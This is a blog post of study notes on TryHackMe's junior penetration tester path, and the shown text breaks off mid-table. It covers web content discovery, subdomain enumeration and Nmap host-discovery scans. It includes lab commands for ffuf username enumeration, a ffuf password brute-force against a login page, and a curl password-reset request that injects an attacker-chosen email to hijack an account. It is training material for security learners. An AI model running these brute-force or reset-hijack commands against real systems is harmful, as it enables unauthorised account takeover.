<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>TryHackMe_2 | yake-daigua</title><meta name="keywords" content="PEN,THM"><meta name="author" content="yake-daigua"><meta name="copyright" content="yake-daigua"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Jr Pentetration TesterThis learning path covers the core technical skills that will allow you to succeed as a junior penetration tester. Upon completing this path, you will have the practical skills n">
<meta property="og:type" content="article">
<meta property="og:title" content="TryHackMe_2">
<meta property="og:url" content="https://yake-daigua.top/2022/12/10/TryHackMe_2/index.html">
<meta property="og:site_name" content="yake-daigua">
<meta property="og:description" content="Jr Pentetration TesterThis learning path covers the core technical skills that will allow you to succeed as a junior penetration tester. Upon completing this path, you will have the practical skills n">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/220703.jpg">
<meta property="article:published_time" content="2022-12-10T13:59:02.000Z">
<meta property="article:modified_time" content="2022-12-10T14:08:16.925Z">
<meta property="article:author" content="yake-daigua">
<meta property="article:tag" content="PEN">
<meta property="article:tag" content="THM">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/220703.jpg"><link rel="shortcut icon" href="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/微信图片_20220920163546.jpg"><link rel="canonical" href="https://yake-daigua.top/2022/12/10/TryHackMe_2/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'TryHackMe_2',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-12-10 22:08:16'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/mycss.css"><link rel="stylesheet" href="/css/mycss2.css"><link rel="stylesheet" href="/css/mycss3.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/微信图片_20220920163546.jpg" onerror="onerror=null;src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/timeline/"><i class="fa-fw fa fa-bell"></i><span> 日志</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-list"></i><span> 更多</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/about/"><i class="fa-fw fa fa-street-view"></i><span> 笔者</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-heartbeat"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/video/"><i class="fa-fw fa fa-video-camera"></i><span> 番剧</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/220703.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">yake-daigua</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/timeline/"><i class="fa-fw fa fa-bell"></i><span> 日志</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-list"></i><span> 更多</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/about/"><i class="fa-fw fa fa-street-view"></i><span> 笔者</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-heartbeat"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/video/"><i class="fa-fw fa fa-video-camera"></i><span> 番剧</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">TryHackMe_2</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-12-10T13:59:02.000Z" title="发表于 2022-12-10 21:59:02">2022-12-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-10T14:08:16.925Z" title="更新于 2022-12-10 22:08:16">2022-12-10</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/PEN/">PEN</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/PEN/THM/">THM</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="TryHackMe_2"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Jr-Pentetration-Tester"><a href="#Jr-Pentetration-Tester" class="headerlink" title="Jr Pentetration Tester"></a>Jr Pentetration Tester</h1><p>This learning path covers the core technical skills that will allow you to succeed as a junior penetration tester. Upon completing this path, you will have the practical skills necessary to perform security assessments against web applications and enterprise infrastructure.</p>
<h1 id="Introduction-to-Cyber-Security"><a href="#Introduction-to-Cyber-Security" class="headerlink" title="Introduction to Cyber Security"></a>Introduction to Cyber Security</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster -u http://fakebank.com -w wordlist.txt dir</span><br></pre></td></tr></table></figure>

<h1 id="Introduction-to-Pentesting"><a href="#Introduction-to-Pentesting" class="headerlink" title="Introduction to Pentesting"></a>Introduction to Pentesting</h1><p>The ROE is a document that is created at the initial stages of a penetration testing engagement. This document consists of three main sections (explained in the table below), which are ultimately responsible for deciding how the engagement is carried out. The SANS institute has a great example of this document which you can view online <a target="_blank" rel="noopener" href="https://sansorg.egnyte.com/dl/bF4I3yCcnt/">here</a>.</p>
<table>
<thead>
<tr>
<th><strong>Section</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody><tr>
<td>Permission</td>
<td>This section of the document gives explicit permission for the engagement to be carried out. This permission is essential to legally protect individuals and organisations for the activities they carry out.</td>
</tr>
<tr>
<td>Test Scope</td>
<td>This section of the document will annotate specific targets to which the engagement should apply. For example, the penetration test may only apply to certain servers or applications but not the entire network.</td>
</tr>
<tr>
<td>Rules</td>
<td>The rules section will define exactly the techniques that are permitted during the engagement. For example, the rules may specifically state that techniques such as phishing attacks are prohibited, but MITM (Man-in-the-Middle) attacks are okay.</td>
</tr>
</tbody></table>
<h1 id="Intro-to-Web-Hacking"><a href="#Intro-to-Web-Hacking" class="headerlink" title="Intro to Web Hacking"></a>Intro to Web Hacking</h1><h3 id="Content-DIscovery"><a href="#Content-DIscovery" class="headerlink" title="Content DIscovery"></a>Content DIscovery</h3><p><strong>Robots.txt</strong></p>
<p>The robots.txt file is a document that tells search engines which pages they are and aren’t allowed to show on their search engine results or ban specific search engines from crawling the website altogether. It can be common practice to restrict certain website areas so they aren’t displayed in search engine results. These pages may be areas such as administration portals or files meant for the website’s customers. This file gives us a great list of locations on the website that the owners don’t want us to discover as penetration testers.</p>
<p><strong>Favicon</strong></p>
<p>The favicon is a small icon displayed in the browser’s address bar or tab used for branding a website.</p>
<p>Sometimes when frameworks are used to build a website, a favicon that is part of the installation gets leftover, and if the website developer doesn’t replace this with a custom one, this can give us a clue on what framework is in use. OWASP host a database of common framework icons that you can use to check against the targets favicon <a target="_blank" rel="noopener" href="https://wiki.owasp.org/index.php/OWASP_favicon_database">https://wiki.owasp.org/index.php/OWASP_favicon_database</a>. Once we know the framework stack, we can use external resources to discover more about it (see next section).</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl https://static-labs.tryhackme.cloud/sites/favicon/images/favicon.ico | md5sum</span><br><span class="line">https://wiki.owasp.org/index.php/OWASP_favicon_database</span><br><span class="line">//to find what framework a website using</span><br></pre></td></tr></table></figure>

<p><strong>Sitemap.xml</strong></p>
<p>Unlike the robots.txt file, which restricts what search engine crawlers can look at, the sitemap.xml file gives a list of every file the website owner wishes to be listed on a search engine. These can sometimes contain areas of the website that are a bit more difficult to navigate to or even list some old webpages that the current site no longer uses but are still working behind the scenes.</p>
<p><strong>HTTP Headers</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.41.109 -v</span><br></pre></td></tr></table></figure>

<p><strong>Framework Stack</strong></p>
<p>Once you’ve established the framework of a website, either from the above favicon example or by looking for clues in the page source such as comments, copyright notices or credits, you can then locate the framework’s website. </p>
<p><strong>Google Hacking&#x2F;Dorking</strong></p>
<table>
<thead>
<tr>
<th><strong>Filter</strong></th>
<th><strong>Example</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody><tr>
<td>site</td>
<td>site:tryhackme.com</td>
<td>returns results only from the specified website address</td>
</tr>
<tr>
<td>inurl</td>
<td>inurl:admin</td>
<td>returns results that have the specified word in the URL</td>
</tr>
<tr>
<td>filetype</td>
<td>filetype:pdf</td>
<td>returns results which are a particular file extension</td>
</tr>
<tr>
<td>intitle</td>
<td>intitle:admin</td>
<td>returns results that contain the specified word in the title</td>
</tr>
</tbody></table>
<p><strong>Wappalyzer</strong></p>
<p><a target="_blank" rel="noopener" href="https://www.wappalyzer.com/">https://www.wappalyzer.com/</a></p>
<p><strong>Wayback Machine</strong></p>
<p>The Wayback Machine (<a target="_blank" rel="noopener" href="https://archive.org/web/">https://archive.org/web/</a>) is a historical archive of websites that dates back to the late 90s. You can search a domain name, and it will show you all the times the service scraped the web page and saved the contents. This service can help uncover old pages that may still be active on the current website.</p>
<p><strong>GitHub</strong></p>
<p>Git : version control system</p>
<p><strong>S3 Buckets</strong></p>
<p>S3 Buckets are a storage service provided by Amazon AWS, allowing people to save files and even static website content in the cloud accessible over HTTP and HTTPS. The owner of the files can set access permissions to either make files public, private and even writable. Sometimes these access permissions are incorrectly set and inadvertently allow access to files that shouldn’t be available to the public. The format of the S3 buckets is http(s):&#x2F;&#x2F;<strong>{name}.</strong><a target="_blank" rel="noopener" href="http://s3.amazonaws.com/"><strong>s3.amazonaws.com</strong></a> where {name} is decided by the owner, such as <a target="_blank" rel="noopener" href="http://tryhackme-assets.s3.amazonaws.com/">tryhackme-assets.s3.amazonaws.com</a>. S3 buckets can be discovered in many ways, such as finding the URLs in the website’s page source, GitHub repositories, or even automating the process. One common automation method is by using the company name followed by common terms such as <strong>{name}</strong>-assets, <strong>{name}</strong>-www, <strong>{name}</strong>-public, <strong>{name}</strong>-private, etc.</p>
<p><strong>Automated Discovery</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://10.10.41.109/FUZZ</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://10.10.41.109/ /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir --url http://10.10.41.109/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://github.com/danielmiessler/SecLists">https://github.com/danielmiessler/SecLists</a></p>
<h3 id="SubDomain-Enumeration"><a href="#SubDomain-Enumeration" class="headerlink" title="SubDomain Enumeration"></a>SubDomain Enumeration</h3><p><strong>SSL&#x2F;TLS Certificates</strong></p>
<p>When an SSL&#x2F;TLS (Secure Sockets Layer&#x2F;Transport Layer Security) certificate is created for a domain by a CA (Certificate Authority), CA’s take part in what’s called “Certificate Transparency (CT) logs”. These are publicly accessible logs of every SSL&#x2F;TLS certificate created for a domain name. The purpose of Certificate Transparency logs is to stop malicious and accidentally made certificates from being used. We can use this service to our advantage to discover subdomains belonging to a domain, sites like <a target="_blank" rel="noopener" href="http://crt.sh/">https://crt.sh</a> and <a target="_blank" rel="noopener" href="https://ui.ctsearch.entrust.com/ui/ctsearchui">https://ui.ctsearch.entrust.com/ui/ctsearchui</a> offer a searchable database of certificates that shows current and historical results.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://crt.sh</span><br><span class="line">https://ui.ctsearch.entrust.com/ui/ctsearchui</span><br></pre></td></tr></table></figure>

<p><strong>Search Engines</strong></p>
<p>Search engines contain trillions of links to more than a billion websites, which can be an excellent resource for finding new subdomains. Using advanced search methods on websites like Google, such as the site: filter, can narrow the search results. For example, “-site:<a target="_blank" rel="noopener" href="http://www.domain.com/">www.domain.com</a> site:*.domain.com” would only contain results leading to the domain name domain.com but exclude any links to <a target="_blank" rel="noopener" href="http://www.domain.com/">www.domain.com</a>; therefore, it shows us only subdomain names belonging to domain.com.</p>
<p><strong>OSINT-Sublist3r</strong></p>
<p><strong>subDomainsBrute</strong></p>
<p><strong>Virtual Hosts</strong></p>
<p>Some subdomains aren’t always hosted in publically accessible DNS results, such as development versions of a web application or administration portals. Instead, the DNS record could be kept on a private DNS server or recorded on the developer’s machines in their &#x2F;etc&#x2F;hosts file (or c:\windows\system32\drivers\etc\hosts file for Windows users) which maps domain names to IP addresses. </p>
<p>Because web servers can host multiple websites from one server when a website is requested from a client, the server knows which website the client wants from the <strong>Host</strong> header. We can utilise this host header by making changes to it and monitoring the response to see if we’ve discovered a new website.</p>
<p>Like with DNS Bruteforce, we can automate this process by using a wordlist of commonly used subdomains.</p>
<p>Start an AttackBox and then try the following command against the Acme IT Support machine to try and discover a new subdomain.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user@machine$ ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H &quot;Host: FUZZ.acmeitsupport.thm&quot; -u http://MACHINE_IP</span><br></pre></td></tr></table></figure>

<p>The above command uses the <strong>-w</strong> switch to specify the wordlist we are going to use. The <strong>-H</strong> switch adds&#x2F;edits a header (in this instance, the Host header), we have the <strong>FUZZ</strong> keyword in the space where a subdomain would normally go, and this is where we will try all the options from the wordlist.</p>
<p>Because the above command will always produce a valid result, we need to filter the output. We can do this by using the page size result with the <strong>-fs</strong> switch. Edit the below command replacing {size} with the most occurring size value from the previous result and try it on the AttackBox.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user@machine$ ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H &quot;Host: FUZZ.acmeitsupport.thm&quot; -u http://MACHINE_IP -fs &#123;size&#125;</span><br></pre></td></tr></table></figure>

<p>This command has a similar syntax to the first apart from the <strong>-fs</strong> switch, which tells ffuf to ignore any results that are of the specified size.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-fs                 Filter HTTP response size. Comma separated list of sizes and ranges</span><br></pre></td></tr></table></figure>

<h3 id="Authentication-Bypass"><a href="#Authentication-Bypass" class="headerlink" title="Authentication Bypass"></a>Authentication Bypass</h3><p><strong>Username Enumeration</strong></p>
<p>A helpful exercise to complete when trying to find authentication vulnerabilities is creating a list of valid usernames, which we’ll use later in other tasks.</p>
<p>Website error messages are great resources for collating this information to build our list of valid usernames. We have a form to create a new user account if we go to the Acme IT Support website (<a target="_blank" rel="noopener" href="http://10.10.172.56/customers/signup">http://MACHINE_IP&#x2F;customers&#x2F;signup</a>) signup page.</p>
<p>If you try entering the username <strong>admin</strong> and fill in the other form fields with fake information, you’ll see we get the error <strong>An account with this username already exists</strong>. We can use the existence of this error message to produce a list of valid usernames already signed up on the system by using the ffuf tool below. The ffuf tool uses a list of commonly used usernames to check against for any matches.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w /usr/share/seclists/Usernames/Names/names.txt -X POST -d &quot;username=FUZZ&amp;email=x&amp;password=x&amp;cpassword=x&quot; -H &quot;Content-Type: application/x-www-form-urlencoded&quot; -u http://10.10.172.56/customers/signup -mr &quot;username already exists&quot;</span><br></pre></td></tr></table></figure>

<p>In the above example, the <code>-w</code> argument selects the file’s location on the computer that contains the list of usernames that we’re going to check exists. The <code>-X</code> argument specifies the request method, this will be a GET request by default, but it is a POST request in our example. The <code>-d</code> argument specifies the data that we are going to send. In our example, we have the fields username, email, password and cpassword. We’ve set the value of the username to <strong>FUZZ</strong>. In the ffuf tool, the FUZZ keyword signifies where the contents from our wordlist will be inserted in the request. The <code>-H</code> argument is used for adding additional headers to the request. In this instance, we’re setting the <code>Content-Type</code> to the webserver knows we are sending form data. The <code>-u</code> argument specifies the URL we are making the request to, and finally, the <code>-mr</code> argument is the text on the page we are looking for to validate we’ve found a valid username.</p>
<p>The ffuf tool and wordlist come pre-installed on the <strong>AttackBox</strong> or can be installed locally by downloading it from <a target="_blank" rel="noopener" href="https://github.com/ffuf/ffuf">https://github.com/ffuf/ffuf</a>.</p>
<p>Create a file called valid_usernames.txt and add the usernames that you found using ffuf; these will be used in Task 3.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w valid_usernames.txt:W1,/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d &quot;username=W1&amp;password=W2&quot; -H &quot;Content-Type: application/x-www-form-urlencoded&quot; -u http://10.10.172.56/customers/login -fc 200</span><br></pre></td></tr></table></figure>

<p>This ffuf command is a little different to the previous one in Task 2. Previously we used the <strong>FUZZ</strong> keyword to select where in the request the data from the wordlists would be inserted, but because we’re using multiple wordlists, we have to specify our own FUZZ keyword. In this instance, we’ve chosen <code>W1</code> for our list of valid usernames and <code>W2</code> for the list of passwords we will try. The multiple wordlists are again specified with the <code>-w</code> argument but separated with a comma. For a positive match, we’re using the <code>-fc</code> argument to check for an HTTP status code other than 200.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &#x27;http://10.10.172.56/customers/reset?email=robert@acmeitsupport.thm&#x27; -H &#x27;Content-Type: application/x-www-form-urlencoded&#x27; -d &#x27;username=robert&amp;email=&#123;username&#125;@customer.acmeitsupport.thm&#x27;</span><br></pre></td></tr></table></figure>

<h1 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h1><h3 id="Nmap-Live-Host-Discovery"><a href="#Nmap-Live-Host-Discovery" class="headerlink" title="Nmap Live Host Discovery"></a>Nmap Live Host Discovery</h3><p><strong>Nmap Host Discovery Using ARP</strong></p>
<p>ARP scan is possible only if you are on the same subnet as the target systems. On an Ethernet (802.3) and WiFi (802.11), you need to know the MAC address of any system before you can communicate with it. </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn TARGETS</span><br><span class="line"></span><br><span class="line"> If you want Nmap only to perform an ARP scan without port-scanning, you can use</span><br><span class="line"> nmap -PR -sn TARGETS</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install arp-scan</span><br><span class="line">sudo arp-scan -I eth0 -l</span><br></pre></td></tr></table></figure>

<p><strong>Nmap Host Discovery Using ICMP</strong></p>
<p>We can ping every IP address on a target network and see who would respond to our <code>ping</code> (ICMP Type 8&#x2F;Echo) requests with a ping reply (ICMP Type 0). Simple, isn’t it? Although this would be the most straightforward approach, it is not always reliable. Many firewalls block ICMP echo; new versions of MS Windows are configured with a host firewall that blocks ICMP echo requests by default. Remember that an ARP query will precede the ICMP request if your target is on the same subnet.</p>
<p>To use ICMP echo request to discover live hosts, add the option <code>-PE</code>. (Remember to add <code>-sn</code> if you don’t want to follow that with a port scan.) As shown in the following figure, an ICMP echo scan works by sending an ICMP echo request and expects the target to reply with an ICMP echo reply if it is online.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -PE -sn MACHINE_IP/24</span><br></pre></td></tr></table></figure>

<p>Because ICMP echo requests tend to be blocked, you might also consider ICMP Timestamp or ICMP Address Mask requests to tell if a system is online. Nmap uses timestamp request (ICMP Type 13) and checks whether it will get a Timestamp reply (ICMP Type 14).</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -PP -sn MACHINE_IP/24</span><br></pre></td></tr></table></figure>

<p>Similarly, Nmap uses address mask queries (ICMP Type 17) and checks whether it gets an address mask reply (ICMP Type 18). This scan can be enabled with the option <code>-PM</code>. As shown in the figure below, live hosts are expected to reply to ICMP address mask requests.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -PM -sn MACHINE_IP/24</span><br></pre></td></tr></table></figure>

<p><strong>Nmap Host Discovery Using TCP and UDP</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -PS -sn 10.10.68.220/24               //TCP SYN ping</span><br><span class="line"></span><br><span class="line">sudo nmap -PA -sn 10.10.68.220/24				//TCP ACK Ping</span><br><span class="line">By default, port 80 is used. The syntax is similar to TCP SYN ping. -PA should be followed by a port number, range, list, or a combination of them. For example, consider -PA21, -PA21-25 and -PA80,443,8080. If no port is specified, port 80 will be used.</span><br><span class="line"></span><br><span class="line">sudo nmap -PU -sn 10.10.68.220/24</span><br></pre></td></tr></table></figure>

<p>Finally, we can use UDP to discover if the host is online. Contrary to TCP SYN ping, sending a UDP packet to an open port is not expected to lead to any reply. However, if we send a UDP packet to a closed UDP port, we expect to get an ICMP port unreachable packet; this indicates that the target system is up and available.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">masscan MACHINE_IP/24 -p443</span><br><span class="line">masscan MACHINE_IP/24 -p80,443</span><br><span class="line">masscan MACHINE_IP/24 -p22-25</span><br><span class="line">masscan MACHINE_IP/24 ‐‐top-ports 100</span><br><span class="line">Masscan is not installed on the AttackBox; however, it can be installed using apt install masscan.</span><br></pre></td></tr></table></figure>

<p><strong>Using Reverse-DNS Lookup</strong></p>
<p>Nmap’s default behaviour is to use reverse-DNS online hosts. Because the hostnames can reveal a lot, this can be a helpful step. However, if you don’t want to send such DNS queries, you use <code>-n</code> to skip this step.</p>
<p>By default, Nmap will look up online hosts; however, you can use the option <code>-R</code> to query the DNS server even for offline hosts. If you want to use a specific DNS server, you can add the <code>--dns-servers DNS_SERVER</code> option.</p>
<table>
<thead>
<tr>
<th>Scan Type</th>
<th>Example Command</th>
</tr>
</thead>
<tbody><tr>
<td>ARP Scan</td>
<td><code>sudo nmap -PR -sn MACHINE_IP/24</code></td>
</tr>
<tr>
<td>ICMP Echo Scan</td>
<td><code>sudo nmap -PE -sn MACHINE_IP/24</code></td>
</tr>
<tr>
<td>ICMP Timestamp Scan</td>
<td><code>sudo nmap -PP -sn MACHINE_IP/24</code></td>
</tr>
<tr>
<td>ICMP Address Mask Scan</td>
<td><code>sudo nmap -PM -sn MACHINE_IP/24</code></td>
</tr>
<tr>
<td>TCP SYN Ping Scan</td>
<td><code>sudo nmap -PS22,80,443 -sn MACHINE_IP/30</code></td>
</tr>
<tr>
<td>TCP ACK Ping Scan</td>
<td><code>sudo nmap -PA22,80,443 -sn MACHINE_IP/30</code></td>
</tr>
<tr>
<td>UDP Ping Scan</td>
